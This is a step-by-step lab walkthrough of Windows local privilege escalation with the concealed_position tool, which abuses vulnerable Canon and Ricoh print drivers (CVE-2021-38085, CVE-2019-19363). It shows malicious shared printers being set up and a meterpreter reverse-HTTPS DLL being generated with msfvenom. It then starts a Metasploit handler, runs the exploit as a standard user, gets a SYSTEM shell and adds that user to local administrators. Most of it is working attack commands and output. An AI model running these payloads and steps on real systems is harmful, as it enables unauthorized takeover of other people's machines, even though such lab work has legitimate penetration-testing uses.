======================================================================================================================
Windows local privilege escalation example - Bring Your Own Vulnerable Driver 
======================================================================================================================

Source: https://github.com/jacob-baines/concealed_position


========================================================================================================================
Step 1 - Install 2 malicious printers on a Windows machine that you control (e.g. a Windows server 2016 - 192.168.1.51)
========================================================================================================================

Malicious printer servers
--------------------------
RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE
POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE

C:\Users\Administrator\Downloads\release_1.0\release_1.0>cp_server.exe -e POISONDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    server!

[+] Creating temporary space...
[+] Expanding .\cab_files\POISONDAMAGE\oemsetup.cab
[+] Pushing into the driver store
[+] Cleaning up tmp space
[+] Installing print driver
[+] Driver installed!
[+] Installing shared printer
[+] Shared printer installed!
[+] Automation Done.
[!] IMPORTANT MANUAL STEPS!
[0] In Advanced Sharing Settings, Turn off password protected sharing.
[1] Ready to go!

C:\Users\Administrator\Downloads\release_1.0\release_1.0>cp_server.exe -e RADIANTDAMAGE
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    server!

[+] Creating temporary space...
[+] Expanding .\cab_files\RADIANTDAMAGE\TR1506.cab
[+] Pushing into the driver store
[+] Cleaning up tmp space
[+] Installing print driver
[+] Driver installed!
[+] Installing shared printer
[+] Shared printer installed!
[+] Automation Done.
[!] IMPORTANT MANUAL STEPS!
[0] In Advanced Sharing Settings, Turn off password protected sharing.
[1] Ready to go!

C:\Users\Administrator\Downloads\release_1.0\release_1.0>

C:\Users\Administrator\Downloads\release_1.0\release_1.0>powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Downloads\release_1.0\release_1.0> get-printer

Name                           ComputerName    Type         DriverName                PortName        Shared   Publishe                                                                                                               d
----                           ------------    ----         ----------                --------        ------   --------
RADIANTDAMAGE                                  Local        Canon TR150 series        LPT1:           True     False
POISONDAMAGE                                   Local        PCL6 Driver for Univer... LPT1:           True     False
Microsoft XPS Document Writer                  Local        Microsoft XPS Document... PORTPROMPT:     False    False
Microsoft Print to PDF                         Local        Microsoft Print To PDF    PORTPROMPT:     False    False


=> The malicous printers "RADIANTDAMAGE" and "POISONDAMAGE" are reachable over the network


PS C:\Users\Administrator.PO718687\Documents\Tools-AD\PowerSploit\Privesc> net view \\192.168.1.51
Shared resources at \\192.168.1.51

Webserver1

Share name     Type   Used as  Comment
-------------------------------------------------------------------------------
POISONDAMAGE   Print           Concealed Position
RADIANTDAMAGE  Print           Concealed Position
Users          Disk
The command completed successfully.

========================================================================================================================
Step 2 - Generate an encrypted malicious x64 DLL with meterpreter (reverse HTTPS)
========================================================================================================================

msf6 exploit(multi/handler) > msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=8443 -f dll -o superprivesc.dll
[*] exec: msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=8443 -f dll -o superprivesc.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 604 bytes
Final size of dll file: 8704 bytes
Saved as: superprivesc.dll


========================================================================================================================
Step 3 - Start a metaplsoit reverse HTTPS handler
========================================================================================================================

jeff@kali:~/Documents/Tools/Privesc-driver$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.30; set LPORT 8443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
[!] The following modules were loaded with warnings:
[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
[!] Please see /root/.msf4/logs/framework.log for details.
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.1.14-dev                          ]
+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_https
LHOST => 192.168.1.30
LPORT => 8443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableStageEncoding => true
EnableUnicodeEncoding => true
HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.1.30:8443
msf6 exploit(multi/handler) > 



Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_https
LHOST => 192.168.1.30
LPORT => 8443
EXITFUNC => thread
ExitOnSession => false
SessionCommunicationTimeout => 0
EnableStageEncoding => true
EnableUnicodeEncoding => true
HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started HTTPS reverse handler on https://192.168.1.30:8443
msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

No active sessions.


====================================================================================================================================================
Step 4 - Log into a Windows 10 box (fully patched) and add the malicious printers and run the exploits (concealed_position) to escalate your privileges
====================================================================================================================================================

> 4.1 - Log into a Windows 10 laptop (fully patched) with a standard account ('auditor' in this example) that is not administrator of the laptop.


> 4.2 - Browse the IP address (\\192.168.1.51\) of the malicious printers with your explorer and add the 2 evil printers (RADIANTDAMAGE & POISONDAMAGE)
        by double cliking on them.


> 4.3 - Run the concealed_position's client software that will execute our malicious DLL
--------------------------------------------------------------------------------------------

C:\Users\Auditor\Documents\Driver>cp_client.exe -l -e RADIANTDAMAGE -d C:\Users\Auditor\Documents\Driver\superprivesc.dll
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!

[+] User provided DLL: C:\Users\Auditor\Documents\Driver\superprivesc2.dll
[+] Checking if driver is already installed
[+] Driver installed!
[+] Starting RadiantDamage
[+] Checking if C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon TR150 series\LanguageModules\040C\ exists
[+] File C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon TR150 series\LanguageModules\040C\CNMurGE.dll has been truncated
[+] Configuring monitoring of C:\ProgramData\CanonBJ\IJPrinter\CNMWINDOWS\Canon TR150 series\LanguageModules\040C\
[+] Installing printer
[+] Exploit complete.


C:\Users\Auditor\Documents\Driver>cp_client.exe -l -e POISONDAMAGE -d C:\Users\Auditor\Documents\Driver\superprivesc.dll
 _______  _______  __    _  _______  _______  _______  ___      _______  ______
|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
 _______  _______  _______  ___   _______  ___   _______  __    _
|       ||       ||       ||   | |       ||   | |       ||  |  | |
|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|    client!

[+] User provided DLL: C:\Users\Auditor\Documents\Driver\superprivesc2.dll
[+] Checking if driver is already installed
[+] Driver installed!
[+] Starting PoisonDamage
[+] Checking if C:\ProgramData\RICOH_DRV\PCL6 Driver for Universal Print\_common\dlz\ exists
[+] File C:\ProgramData\RICOH_DRV\PCL6 Driver for Universal Print\_common\dlz\watermark.dll has been truncated
[+] Configuring monitoring of C:\ProgramData\RICOH_DRV\PCL6 Driver for Universal Print\_common\dlz\
[+] Installing printer
[+] Exploit complete.

> 4.4 - Use the meterpreter reverse shell session running as Local System to add the standard user 'auditor' in the local administrator group
-----------------------------------------------------------------------------------------------------------------------------------------------

msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > [!] https://192.168.1.30:8443 handling request from 192.168.1.173; (UUID: fgjncjcd) Without a database connected that payload UUID tracking will not work!
msf6 exploit(multi/handler) > [*] https://192.168.1.30:8443 handling request from 192.168.1.173; (UUID: fgjncjcd) Encoded stage with x64/xor_dynamic
msf6 exploit(multi/handler) > [*] https://192.168.1.30:8443 handling request from 192.168.1.173; (UUID: fgjncjcd) Staging x64 payload (202061 bytes) ...
msf6 exploit(multi/handler) > [!] https://192.168.1.30:8443 handling request from 192.168.1.173; (UUID: fgjncjcd) Without a database connected that payload UUID tracking will not work!
msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened (192.168.1.30:8443 -> 127.0.0.1 ) at 2022-11-03 02:17:17 +0100

msf6 exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                                Connection
  --  ----  ----                     -----------                                ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DESKTOP-6LNJ3G2      192.168.1.30:8443 -> 127.0.0.1  (10.0.2.15)

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM


meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface  6
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:39:d3:a3
MTU          : 1500
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::9185:206f:269d:e105
IPv6 Netmask : ffff:ffff:ffff:ffff::


meterpreter > execute -f cmd.exe -i
Process 6204 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19042.631]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
DESKTOP-6LNJ3G2

C:\Windows\system32>net user
net user

User accounts for \\
-------------------------------------------------------------------------------
Administrator            Auditor                  DefaultAccount           
Guest                    WDAGUtilityAccount       
The command completed with one or more errors.


C:\Windows\system32>net localgroup administrators auditor /add
net localgroup administrators auditor /add
The command completed successfully.

C:\Windows\system32>

